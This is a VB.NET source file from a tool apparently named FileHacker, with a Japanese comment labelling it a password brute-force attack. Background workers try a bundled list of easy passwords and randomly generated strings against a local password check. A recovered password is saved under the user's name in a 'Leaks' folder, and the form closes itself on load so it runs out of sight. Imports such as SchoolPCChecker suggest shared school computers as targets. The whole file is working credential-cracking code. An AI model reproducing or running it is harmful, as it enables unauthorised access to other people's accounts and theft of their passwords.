'パスワード総当り攻撃
Imports System.ComponentModel
Imports FHCodePack.SchoolPCChecker
Imports System.IO
Imports PasswordAttacker.Tools
Imports FHCodePack

Public Class FileHackerAdditionalTools
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Close()
    End Sub
    Dim cancelPending As Boolean = False
    Dim pw As New Queue(Of String)
    Dim easy As New BackgroundWorker '簡単なパスワード
    Dim generate As BackgroundWorker() = New BackgroundWorker(199) {} '攻撃用パスワードの生成(記号無し)
    Dim external As BackgroundWorker() = New BackgroundWorker(199) {} '攻撃用パスワードの生成(記号含む)
    Dim check As BackgroundWorker() = New BackgroundWorker(199) {} '攻撃用パスワードの検証
    Public Function GetWorkers(sender As Object) As BackgroundWorker()
        AddHandler easy.DoWork,
            Sub(sender_ As Object, e As DoWorkEventArgs)
                For Each j In My.Resources.EasyPasswords.Split(vbCrLf)
                    j = j.Replace(vbCr, "").Replace(vbLf, "")
                    pw.Enqueue(j.ToLower)
                    pw.Enqueue(j.ToUpper)
                Next
            End Sub
        For i = 0 To generate.Length - 1
            generate(i) = New BackgroundWorker
            AddHandler generate(i).DoWork,
                Sub(sender_ As Object, e As DoWorkEventArgs)
                    Dim Chars As String = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
                    While Not cancelPending
                        Try
                            Chars = ShuffleChars(ShuffleChars(Chars)) '2回シャッフル
                            WL("Attack Seed(" & FindInArray(Of BackgroundWorker)(generate, sender_) & "):" & Chars)
                            Dim l = CInt((VBMath.Rnd * (127 - 8)) + 7)
                            Dim s As String = ""
                            For a = 1 To l
                                s += Chars(VBMath.Rnd * (Chars.Length - 1))
                            Next
                            pw.Enqueue(s)
                        Catch
                        End Try
                    End While
                End Sub
        Next
        For i = 0 To external.Length - 1
            external(i) = New BackgroundWorker
            AddHandler external(i).DoWork,
                Sub(sender_ As Object, e As DoWorkEventArgs)
                    Dim Chars As String = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ `~!@#$%^&*()_-+={}[]\|:;""'<>,.?/"
                    While Not cancelPending
                        Try
                            Chars = ShuffleChars(ShuffleChars(Chars)) '2回シャッフル
                            WL("Attack Seed(" & FindInArray(Of BackgroundWorker)(generate, sender_) & "):" & Chars)
                            Dim l = CInt((VBMath.Rnd * (127 - 8)) + 7)
                            Dim s As String = ""
                            For a = 1 To l
                                s += Chars(VBMath.Rnd * (Chars.Length - 1))
                            Next
                            pw.Enqueue(s)
                        Catch
                        End Try
                    End While
                End Sub
        Next
        For i = 0 To check.Length - 1
            check(i) = New BackgroundWorker
            AddHandler check(i).DoWork,
                Sub(sender_ As Object, e As DoWorkEventArgs)
                    While Not cancelPending
                        While pw.Count <> 0
                            Try
                                Dim s = pw.Dequeue
                                WL("Attack Password(" & FindInArray(Of BackgroundWorker)(check, sender_) & "):" & s)
                                If VerifyPassword(s) Then
                                    WL(GetUN() & "'s Password:" & s)
                                    Save(s)
                                    cancelPending = True
                                    Return
                                End If
                            Catch
                            End Try
                        End While
                    End While
                End Sub
        Next
        Return {easy}.Concat(generate).Concat(external).Concat(check).ToArray
    End Function
    Public Function FindInArray(Of T)(a As T(), value As T) As Long
        Try
            If Not a.Contains(value) Then
                Return -1
            End If
            For i = 0 To a.LongLength - 1
                If a(i).Equals(value) Then
                    Return i
                End If
            Next
            Return -1
        Catch
            Return -1
        End Try
    End Function
    Public Function ShuffleChars(s As String) As String
        Dim chars As Char() = s
        For a = 0 To chars.Length * 1.5
            Dim fromPlace As Integer = (chars.Length - 1) * VBMath.Rnd
            Dim destPlace As Integer = (chars.Length - 1) * VBMath.Rnd
            Dim fromChar As Char = chars(fromPlace)
            Dim destChar As Char = chars(destPlace)
            chars(fromPlace) = destChar
            chars(destPlace) = fromChar
        Next
        Return chars
    End Function
    Public Function WL(s As String) As String
        Console.WriteLine(s)
        Return s
    End Function
    Public Sub Save(pw As String)
        MakeFolder(FHTools.GetFHPath("Leaks"))
        Tools.SerializeObject(New PasswordStronghold(pw), FHTools.GetFHPath("Leaks", "Password_" & GetUN() & ".xml"))
    End Sub
    Public Shared Sub MakeFolder(path As String)
        If Not Directory.Exists(path) Then
            Directory.CreateDirectory(path)
        End If
    End Sub
End Class
